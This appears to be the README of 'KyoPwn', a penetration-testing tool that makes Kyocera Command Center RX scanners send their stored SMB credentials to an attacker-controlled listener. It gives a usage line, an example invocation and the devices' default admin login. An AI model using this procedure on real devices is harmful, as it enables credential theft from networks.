# KyoPwn
by G-Factor Security (@GFSec)

A tool to steal SMB credentials from Kyocera Command Center RX scanners

This tool will start an SMB listener (via Metasploit) and send the necessary request
to the target device to send an SMB test to your local listener, capturing SMB credentials

Usage: ./kyopwn.sh KyoceraIP YourIP YourSMBPort SMBUser AdminUser AdminPW

KyoceraIP: The IP of the targeted device
YourIP: The IP address of your local system (for sending credentials)
YourSMBPort: The local port for receiving SMB requests
SMBUser: The username of the account you wish to steal
AdminUser: The username of an admin on the Kyocera (default on devices is 'Admin', case-sensitive)
AdminPW : The password of the admin account being used on the Kyocera (default on devices is 'Admin')

Exampe: ./kyopwn.sh 192.168.0.2 192.168.0.100 445 ScanUser Admin Admin
